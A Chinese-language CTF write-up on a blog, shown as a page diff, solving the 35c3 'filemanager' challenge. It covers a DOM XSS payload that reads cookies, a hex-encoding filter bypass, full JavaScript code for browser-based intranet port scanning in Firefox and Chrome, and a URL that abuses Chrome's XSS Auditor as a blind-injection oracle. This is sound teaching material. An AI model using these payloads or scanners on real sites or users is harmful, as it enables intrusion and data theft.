@@ -6,19 +6,57 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://ph0rse.me">
-  <title>Archives | Ph0rse&#39;s Blog</title>
+  <title>JavaScript前端盲注 | Ph0rse&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="CUIT就读，Auto代码审计，唯一优点就是帅~">
+  <meta name="description" content="文章首发于先知社区 前言看到wonderkun师傅的新更的一篇博客，写35c3CTF中的一道题：利用chrome XSS Auditor机制，进行盲注，特别好玩儿。 博客简明扼要，但我这个前端瞎子看不太懂后半部分，留下了不懂技术的泪水……好在国外有位大表哥把解题思路写了出来，自己在摸索中收获颇多，于是打算写篇文章，把其中涉及的基础知识介绍一下。 一来，介绍这个不算严重，但在Web2.0厚客户端背景">
 <meta name="keywords" content="Web,安全,Python,Java,PHP,Coder,Hacker,Linux,程序员,工程师,渗透,优化,帅哥,机器学习">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Ph0rse&#39;s Blog">
-<meta property="og:url" content="http://ph0rse.me/archives/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JavaScript前端盲注">
+<meta property="og:url" content="http://ph0rse.me/2019/02/16/JavaScript前端盲注/index.html">
 <meta property="og:site_name" content="Ph0rse&#39;s Blog">
-<meta property="og:description" content="CUIT就读，Auto代码审计，唯一优点就是帅~">
+<meta property="og:description" content="文章首发于先知社区 前言看到wonderkun师傅的新更的一篇博客，写35c3CTF中的一道题：利用chrome XSS Auditor机制，进行盲注，特别好玩儿。 博客简明扼要，但我这个前端瞎子看不太懂后半部分，留下了不懂技术的泪水……好在国外有位大表哥把解题思路写了出来，自己在摸索中收获颇多，于是打算写篇文章，把其中涉及的基础知识介绍一下。 一来，介绍这个不算严重，但在Web2.0厚客户端背景">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142253-50f37bd2-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142253-510e02a4-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142254-5180cdc0-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142254-5196a550-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142254-51ae2fd6-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142254-51be3980-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142255-51cec6ce-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142255-51f44732-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142255-520527aa-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142255-5219d146-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142255-5232450a-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142255-524a461e-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142256-5266968e-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142256-5280743c-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142256-52943c06-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142256-52a3b474-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142256-52b7570e-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142256-52c982d0-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142256-52dca3f6-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142257-5300db40-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190103210956-de0bcdb4-0f58-1.gif">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142257-531a2b0e-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142257-533f4a88-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142257-535baa48-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142257-537df094-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142258-539dbe92-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142258-53ad33fe-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142258-53cadc38-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142258-53f36a36-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142258-540bf66e-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142258-541e728a-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142259-544ba138-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142259-5470678e-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142259-548fdcae-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142259-54a1d3c8-1ed7-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142259-54b99da0-1ed7-1.png">
+<meta property="og:updated_time" content="2019-02-16T08:58:28.097Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Ph0rse&#39;s Blog">
-<meta name="twitter:description" content="CUIT就读，Auto代码审计，唯一优点就是帅~">
+<meta name="twitter:title" content="JavaScript前端盲注">
+<meta name="twitter:description" content="文章首发于先知社区 前言看到wonderkun师傅的新更的一篇博客，写35c3CTF中的一道题：利用chrome XSS Auditor机制，进行盲注，特别好玩儿。 博客简明扼要，但我这个前端瞎子看不太懂后半部分，留下了不懂技术的泪水……好在国外有位大表哥把解题思路写了出来，自己在摸索中收获颇多，于是打算写篇文章，把其中涉及的基础知识介绍一下。 一来，介绍这个不算严重，但在Web2.0厚客户端背景">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190123142253-50f37bd2-1ed7-1.png">
   
     <link rel="alternative" href="/atom.xml" title="Ph0rse&#39;s Blog" type="application/atom+xml">
   
@@ -162,194 +200,273 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-JavaScript前端盲注" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      JavaScript前端盲注
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/02/16/JavaScript前端盲注/" class="archive-article-date">
+
+        
+        <a href="/2019/02/16/JavaScript前端盲注/" class="archive-article-date">
   	<time datetime="2019-02-16T08:57:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-16</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/02/16/JavaScript前端盲注/">JavaScript前端盲注</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
+        
+      </header>
     
-    
+    <div class="article-entry" itemprop="articleBody">
       
-        </div></section>
+        <p>文章首发于<a href="https://xz.aliyun.com/t/3766" target="_blank" rel="noopener">先知社区</a></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看到wonderkun师傅的新更的一篇<a href="http://wonderkun.cc/index.html/?p=747" target="_blank" rel="noopener">博客</a>，写<a href="https://35c3ctf.ccc.ac/challenges/" target="_blank" rel="noopener">35c3CTF</a>中的一道题：利用chrome XSS Auditor机制，进行盲注，特别好玩儿。</p>
+<p>博客简明扼要，但我这个前端瞎子看不太懂后半部分，留下了不懂技术的泪水……好在国外有位大表哥把解题思路写了出来，自己在摸索中收获颇多，于是打算写篇文章，把其中涉及的基础知识介绍一下。</p>
+<p>一来，介绍这个不算严重，但在Web2.0厚客户端背景下，<strong>有点儿意思</strong>的漏洞；<br>二来，安利一下35c3CTF这个高水平、高质量的国际赛事。</p>
+<h2 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h2><p>//很幸运，写文的时候题目环境还没关，</p>
+<p>这道题在比赛期间，只有5支队伍成功做出来<br>题目说明：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142253-50f37bd2-1ed7-1.png" alt="Alt text"><br>从中我们可以得知，题目考察chrome-headless相关知识点，浏览器特性相关的话，大概率是XSS。</p>
+<p>浏览一下<code>https://filemanager.appspot.com</code><br>（PS：CTF的好习惯，“访问任何题目地址，都顺便用源码泄露扫一遍；见到任何框框，都随便用sqlmap插一下”，在这道题里，不存在敏感信息泄露和SQL注入，所以就不再赘述了。）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142253-510e02a4-1ed7-1.png" alt="Alt text"></p>
+<p>填入admin之后，正常进入管理页面，可以任意登录admin？？原来网站是依赖Session识别用户，把session对应的资源展示出来，所以即使页面显示你是admin，也拿不到真正admin用户的资源。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142254-5180cdc0-1ed7-1.png" alt="Alt text"></p>
+<p>页面上有两个功能，一个查找文件，一个创建文件：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142254-5196a550-1ed7-1.png" alt="Alt text"></p>
+<p>不好意思……本能地写一句话</p>
+<p>文件创建成功，但貌似只是一个普通的文本，没有解析<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142254-51ae2fd6-1ed7-1.png" alt="Alt text"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142254-51be3980-1ed7-1.png" alt="Alt text"></p>
+<p>因为有<code>?filename=</code>，尝试一下文件读取，emmmm，放心，肯定是失败的（不然本文题目就不会是XSS盲注了，23333</p>
+<p>后端代码解析不了，试试前端代码呗~发现还是没有任何解析<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142255-51cec6ce-1ed7-1.png" alt="Alt text"></p>
+<p>那大概率就是xss了~</p>
+<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><p>右击！查看源码！（PPS：这么晚才看前端源码，只是因为…我,似鸽前端瞎 ；我,没得感情）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142255-51f44732-1ed7-1.png" alt="Alt text"></p>
+<p>这个看似神秘的地方，作用就是</p>
+<ol>
+<li>给/create接口传个POST请求，把文件名和内容传过去</li>
+<li>在页面添加一个指向该（假）文件的超链接<br> 像这样：<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142255-520527aa-1ed7-1.png" alt="Alt text"></li>
+</ol>
+<p>（PPPS：由于写入的POST请求携带了XSRF头，所以无法进行CSRF攻击</p>
+<p>暂定create接口和超链接没问题，再看下search接口：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142255-5219d146-1ed7-1.png" alt="Alt text"></p>
+<p>这里我们尝试搜索一些常用的关键字，如flag/root/admin等，当搜索<code>php</code>关键字时，可以看到有特殊回显，查看源码，发现有一段JavaScript代码，将我们搜索的内容赋给了q变量，随后使用DOM的方式输出到标签中。<br>为什么只有php会有回显呢？因为我们在之前测试的时候，插入了php一句话密码的文本进去。也就是说，这里的<code>search</code>是一个文本搜索功能，当搜索到关键字时，返回被搜索到的文件内容，并把搜索关键字区域高亮显示。<br>我们确定一下，这里是否存在漏洞，<br>直接插入<code>&lt;img src=x onerror=alert(document.cookie);&gt;</code>然后搜索：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142255-5232450a-1ed7-1.png" alt="Alt text"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142255-524a461e-1ed7-1.png" alt="Alt text"></p>
+<p>发现尖括号被HTML实体编码了。尝试js十六进制编码绕过：<br>js十六进制编码：</p>
+<pre><code>str=&quot;&lt;img src=x onerror=alert(document.cookie);&gt;&quot;;
+len=str.length;
+arr=[];
+for(var i=0;i&lt;len;i++){
+arr.push(str.charCodeAt(i).toString(16));
+}
+console.log(&quot;\\x&quot;+arr.join(&quot;\\x&quot;));
+</code></pre><p>F12打开控制台，把上面生成js十六进制编码的代码放到控制台执行就好<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142256-5266968e-1ed7-1.png" alt="Alt text"></p>
+<p>重复之前的操作，create文件，文本内容填上编码后的结果，然后搜索这段字符串：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142256-5280743c-1ed7-1.png" alt="Alt text"><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142256-52943c06-1ed7-1.png" alt="Alt text"><br>可以看到，通过JavaScript的DOM操作，已经弹窗~</p>
+<p>OK，存在XSS漏洞和文本搜索功能，猜测flag已经被写入到真实admin后台了，我们要利用搜索处的的XSS漏洞，获取Flag，那么问题来了，怎么打admin呢？</p>
+<h3 id="XSRF头防御"><a href="#XSRF头防御" class="headerlink" title="XSRF头防御"></a>XSRF头防御</h3><p>别忘了，题目说明还有另一句话。</p>
+<p><code>The admin is using it to store a flag, can you get it? You can reach the admin&#39;s chrome-headless at: nc 35.246.157.192 1</code></p>
+<p>前半句确定了flag是储存在真实admin后台的，后半句告诉我们后台的机器人用的是chrome-headless，并提供了一个nc入口：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142256-52a3b474-1ed7-1.png" alt="Alt text"></p>
+<p>Interesting! 这里用到了<a href="https://zhuanlan.zhihu.com/p/33114775" target="_blank" rel="noopener">区块链技术中的工作量证明算法</a>，并提供了<a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a>的一个<a href="https://www.npmjs.com/package/proof-of-work" target="_blank" rel="noopener">计算工具</a>。</p>
+<p>安装Node.js用自带的npm工具安装这个模块就好：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142256-52b7570e-1ed7-1.png" alt="Alt text"><br>使用方法：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142256-52c982d0-1ed7-1.png" alt="Alt text"></p>
+<p>这种方法很新奇，防止爆破的同时，还控制了服务器负载。（PPPPS：这种方式还可以用在Pwn题中，防止Fork炸弹。</p>
+<p>将计算结果反馈给服务端，提示可以给admin传一个URL，让admin访问：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142256-52dca3f6-1ed7-1.png" alt="Alt text"></p>
+<p>当查询内容存在时，才会被HTML渲染，XSS插入的攻击向量，必须是之前存到文件里的。很容易想到，利用CSRF让admin插入一段攻击向量，再搜索这段攻击向量，从而触发XSS漏洞。但是~<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142257-5300db40-1ed7-1.png" alt="Alt text"><br>不要忘记，create页面在插入时，携带了<a href="https://segmentfault.com/a/1190000011210869" target="_blank" rel="noopener">XSRF头</a>，这导致无法CSRF……</p>
+<p>最后一条题目信息：chrome-headless</p>
+<p>我们可以利用Chrome-Headless对“存在/不存在”的相应差异，进行盲注~也就是我们要引申出的知识点，特定情况下的JavaScript前端盲注。</p>
+<h2 id="JavaScript前端盲注准备"><a href="#JavaScript前端盲注准备" class="headerlink" title="JavaScript前端盲注准备"></a>JavaScript前端盲注准备</h2><h3 id="浏览器对目标端口是否存在的回显差异"><a href="#浏览器对目标端口是否存在的回显差异" class="headerlink" title="浏览器对目标端口是否存在的回显差异"></a>浏览器对目标端口是否存在的回显差异</h3><p>随着浏览器对JavaScript代码的支持，目前我们已经可以仅靠前端代码完成内网端口（10.*）的扫描，并将扫描结果通过DNS外带等方式反馈给攻击者。<br>具体怎么实现呢？首先来看最容易实现的Firefox：<br>Firefox当访问一个不存在的端口时，要么超时，要么拒绝连接。因此我们可以使用iframe发起一个内网请求（如192.168.1.1:80），根据访问结果来判断。同时，由于Firefox不限制iframe的数量，因此可以这样写：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> scanFirefox() &#123;</span><br><span class="line">  <span class="keyword">var</span> that = <span class="keyword">this</span>;</span><br><span class="line">  <span class="keyword">let</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve,reject</span>)</span>&#123;</span><br><span class="line">      that.hooks = &#123;<span class="attr">oncomplete</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> iframes = <span class="built_in">document</span>.getElementsByClassName(<span class="string">'firefox'</span>);</span><br><span class="line">        <span class="keyword">while</span>(iframes.length &gt; <span class="number">0</span>)&#123;</span><br><span class="line">          iframes[<span class="number">0</span>].parentNode.removeChild(iframes[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        resolve();</span><br><span class="line">      &#125;&#125;;</span><br><span class="line">      that.scan = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> port = that.q.shift(), id = <span class="string">'firefox'</span>+(that.pos%<span class="number">1000</span>), iframe = <span class="built_in">document</span>.getElementById(id) ? <span class="built_in">document</span>.getElementById(id) : <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>), timer;</span><br><span class="line">        iframe.style.display = <span class="string">'none'</span>;</span><br><span class="line">        iframe.id = id;</span><br><span class="line">        iframe.src = that.url + <span class="string">":"</span> + port;</span><br><span class="line">        iframe.className = <span class="string">'firefox'</span>;</span><br><span class="line">        that.updateProgress(port);</span><br><span class="line">        iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            that.openPorts.push(port);</span><br><span class="line">            clearTimeout(timer);</span><br><span class="line">            that.next();</span><br><span class="line">        &#125;;</span><br><span class="line">        timer = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          that.next();</span><br><span class="line">        &#125;, <span class="number">50</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">document</span>.body.contains(iframe)) &#123;</span><br><span class="line">          <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      that.scan();</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> promise;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>创建1000个iframe异步/多线程地探测端口，可以试一下<a href="https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning" target="_blank" rel="noopener">Gareth Heyes</a>师傅的<a href="http://portswigger-labs.net/portscan/" target="_blank" rel="noopener">Demo</a>。<br>可以看到探测的速度很快：<br><a href="https://imgchr.com/i/F554wq" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190103210956-de0bcdb4-0f58-1.gif" alt="F554wq.md.gif"></a></p>
+<p>但Chrome相对于Firefox有一些不同，提高了探测的难度。Chrome中即使访问对象不存在，也会返回success~只不过这个Success是Chrome浏览器特权域<code>chrome-error://chromewebdata/</code>的。大概是谷歌的安全研究员想要通过这种方式保护用户吧。<br>但我们可以通过另一种<a href="https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning" target="_blank" rel="noopener">技巧</a>来绕过这种保护：<br>在前端中，iframe去请求一个页面，会触发onload事件，在Chrome中，无论目标端口是否开放，都会成功触发onload，只不过一个是目标端口成功加载的onload，一个是特权域<code>chrome-error://chromewebdata/</code>成功加载的onload。但在这时，如果我们在Url上加入一个锚定符<code>#</code>，再次加载，对于端口开放的页面，因为是同一个页面，所以onload事件不会再次加载。而对于端口不开放的页面，因为Url已经从目标页面换成了<code>chrome-error://chromewebdata/</code>，所以Onload事件会再次加载。<br>这个差异就能被用来判断端口是否开放。</p>
+<p>利用代码如下所示：<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">async scanChromeWindows() &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="literal">that</span> = <span class="keyword">this</span>;</span><br><span class="line">  <span class="keyword">let</span> promise = <span class="keyword">new</span> Promise(<span class="keyword">function</span>(resolve,reject)&#123;</span><br><span class="line">      <span class="literal">that</span>.hooks = &#123;oncomplete:<span class="keyword">function</span>()&#123;</span><br><span class="line">        <span class="keyword">var</span> iframes = <span class="built_in">document</span>.getElementsByClassName(<span class="string">'chrome'</span>);</span><br><span class="line">        <span class="keyword">while</span>(iframes.length &gt; <span class="number">0</span>)&#123;</span><br><span class="line">          iframes[<span class="number">0</span>].parentNode.removeChild(iframes[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        resolve();</span><br><span class="line">      &#125;&#125;;</span><br><span class="line">      <span class="literal">that</span>.scan = <span class="keyword">function</span>()&#123;</span><br><span class="line">        <span class="keyword">var</span> port = <span class="literal">that</span>.q.shift(), id = <span class="string">'chrome'</span>+(<span class="literal">that</span>.pos%<span class="number">500</span>), iframe = <span class="built_in">document</span>.getElementById(id) ? <span class="built_in">document</span>.getElementById(id) : <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>), timer, calls = <span class="number">0</span>;</span><br><span class="line">        iframe.style.display = <span class="string">'none'</span>;</span><br><span class="line">        iframe.id = iframe.name = id;</span><br><span class="line">        iframe.src = <span class="literal">that</span>.url + <span class="string">":"</span> + port;</span><br><span class="line">        iframe.className = <span class="string">'chrome'</span>;</span><br><span class="line">        <span class="literal">that</span>.updateProgress(port);</span><br><span class="line">        iframe.hasLoadedOnce = <span class="number">0</span>;</span><br><span class="line">        iframe.onload = <span class="keyword">function</span>()&#123;</span><br><span class="line">          calls++;</span><br><span class="line">          <span class="keyword">if</span>(calls &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            clearTimeout(timer);</span><br><span class="line">            <span class="literal">that</span>.next();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          iframe.hasLoadedOnce = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span><br><span class="line">            a.target = iframe.name;</span><br><span class="line">            a.href = iframe.src + <span class="string">'#'</span>;</span><br><span class="line">            a.click();</span><br><span class="line">            a = <span class="literal">null</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        timer = setTimeout(<span class="keyword">function</span>()&#123;</span><br><span class="line">          <span class="keyword">if</span>(iframe.hasLoadedOnce) &#123;</span><br><span class="line">            <span class="literal">that</span>.openPorts.push(port);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span>(<span class="literal">that</span>.connections &lt;= <span class="literal">that</span>.maxConnections) &#123;</span><br><span class="line">            <span class="literal">that</span>.next();</span><br><span class="line">            <span class="literal">that</span>.connections++;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;, <span class="number">3000</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">document</span>.body.contains(iframe)) &#123;</span><br><span class="line">          <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="literal">that</span>.scan();</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> promise;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="Chrome-XSS-Auditor的过度敏感"><a href="#Chrome-XSS-Auditor的过度敏感" class="headerlink" title="Chrome XSS Auditor的过度敏感"></a>Chrome XSS Auditor的过度敏感</h3><p>Chrome XSS Auditor，就是那个测XSS漏洞时经常出来拦截的东东<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142257-531a2b0e-1ed7-1.png" alt="Alt text"></p>
+<p>在检测恶意向量时有一个规则，当url中带有页面里的JavaScript资源代码时，就会认为是恶意向量。拿baidu.com举例：<br>在正常页面里，随便找一个被成功解析的script标签<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142257-533f4a88-1ed7-1.png" alt="Alt text"></p>
+<p>随便找一个a参数传入：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142257-535baa48-1ed7-1.png" alt="Alt text"></p>
+<p>呕吼~一个“百度主站XSS”就诞生了~<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142257-537df094-1ed7-1.png" alt="Alt text"></p>
+<p>这个拦截的错误页面，和无法找到服务的错误页面是相似的，都可以二次加载iframe框架里的onload事件。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142258-539dbe92-1ed7-1.png" alt="Alt text"></p>
+<p>这种误报是在原访问请求正常，页面里存在Js资源时生效。所以，回到题目上来看：<br>先随便写个文件~<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142258-53ad33fe-1ed7-1.png" alt="Alt text"></p>
+<p>在搜索成功的界面里，随意找段JavaScript代码：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142258-53cadc38-1ed7-1.png" alt="Alt text"></p>
+<p>构造URL：<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https</span>://filemanager.appspot.com/search?q=test&amp;a=<span class="number">%3</span>Cscript<span class="number">%3</span>E<span class="number">%20</span><span class="number">%20</span><span class="number">%20</span><span class="number">%20</span><span class="number">%28</span><span class="number">%28</span><span class="number">%29</span><span class="number">%3</span>d<span class="number">%3</span>E<span class="number">%7</span>b<span class="number">%0</span>a<span class="number">%20</span><span class="number">%20</span><span class="number">%20</span><span class="number">%20</span><span class="number">%20</span><span class="number">%20</span>for<span class="number">%20</span><span class="number">%28</span>let<span class="number">%20</span>pre<span class="number">%20</span>of<span class="number">%20</span>document<span class="number">%2</span>egetElementsByTagName<span class="number">%28</span><span class="number">%27</span>pre<span class="number">%27</span><span class="number">%29</span><span class="number">%29</span><span class="number">%20</span><span class="number">%7</span>b<span class="number">%0</span>a<span class="number">%20</span><span class="number">%20</span><span class="number">%20</span><span class="number">%20</span><span class="number">%20</span><span class="number">%20</span><span class="number">%20</span><span class="number">%20</span>let<span class="number">%20</span>text<span class="number">%20</span><span class="number">%3</span>d<span class="number">%20</span>pre<span class="number">%2</span>einnerHTML<span class="number">%3</span>b</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142258-53f36a36-1ed7-1.png" alt="Alt text"></p>
+<p>达到了效果。</p>
+<p>而当我们搜索的内容不存在时：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190123142258-540bf66e-1ed7-1.png" alt="Alt text"><br>回显就不一样了。</p>
